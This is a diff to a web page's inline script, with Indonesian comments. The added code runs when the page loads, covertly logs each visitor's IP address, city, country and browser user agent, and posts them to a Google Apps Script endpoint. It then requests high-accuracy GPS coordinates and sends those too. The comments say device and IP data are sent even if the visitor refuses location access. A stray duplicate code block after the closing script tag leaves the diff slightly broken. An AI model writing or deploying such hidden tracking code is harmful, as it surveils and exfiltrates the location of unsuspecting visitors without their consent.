@@ -126,54 +126,69 @@
 </footer>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxDQ6q8B05bIfJbAOOq7mVn5B-oFT8XrkqJMvHrI9hzfbKsZA4uUXTU05GsdLcx2mLIWw/exec";
-let userIP = "Checking...";
-
-// Fungsi mengirim data ke Sheets
-async function sendToSheet(extraData = {}) {
-    const payload = {
-        ip: userIP,
-        userAgent: navigator.userAgent,
-        ...extraData // Menggabungkan data lokasi jika ada
-    };
-
-    await fetch(WEB_APP_URL, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(payload)
-    });
-}
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbz12b-Wp4ZV6zfUgtCfDMmYopQPkd9LCCBkMDfcImgdaefllOykI2shFP9dqI_Cs0ring/exec";
 
 async function startTracker() {
-    // 1. Ambil IP dulu
+    let geoData = {
+        ip: "Gagal Deteksi IP",
+        city: "-",
+        country: "-"
+    };
+
+    // 1. Ambil IP, Kota, dan Negara berdasarkan IP
     try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const d = await res.json();
-        userIP = d.ip;
-    } catch (e) { userIP = "Gagal Deteksi IP"; }
+        const response = await fetch('http://ip-api.com/json/');
+        const d = await response.json();
+        if(d.status === "success") {
+            geoData.ip = d.query;
+            geoData.city = d.city;
+            geoData.country = d.country;
+        }
+    } catch (e) { console.error("Geo-IP Failed"); }
 
-    // 2. KIRIM DATA PERTAMA (Tanpa Lokasi)
-    // Ini memastikan data device & IP masuk meskipun lokasi ditolak nanti
-    sendToSheet();
+    // 2. KIRIM DATA AWAL (Device + Geo IP)
+    // Langsung kirim agar data IP & Wilayah tercatat meskipun user tidak klik Allow GPS
+    await sendToSheet(geoData);
 
-    // 3. Minta Lokasi (Data Kedua)
+    // 3. Minta Lokasi GPS (Presisi Tinggi)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                // Jika diizinkan, kirim data lagi dengan koordinat lengkap
+                // Kirim ulang data dengan koordinat GPS untuk mengupdate baris yang sama
                 sendToSheet({
+                    ...geoData,
                     lat: pos.coords.latitude,
                     long: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 });
             },
-            (err) => {
-                console.log("User menolak lokasi, data device sudah terkirim.");
-            },
+            null,
             { enableHighAccuracy: true, timeout: 5000 }
         );
     }
 }
+
+async function sendToSheet(payloadExtra) {
+    const payload = {
+        userAgent: navigator.userAgent,
+        ...payloadExtra
+    };
+
+    try {
+        await fetch(WEB_APP_URL, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify(payload)
+        });
+    } catch (err) { console.error("Sync failed"); }
+}
+
+// Jalankan saat load
+window.addEventListener('load', () => {
+    startTracker();
+    setTimeout(typeText, 1000); 
+});
+</script>
 
 // Jalankan tracker saat web dibuka
 window.addEventListener('load', () => {
@@ -227,5 +242,6 @@ document.querySelectorAll('.card').forEach(card => {
 
 </body>
 </html>
+
 
 
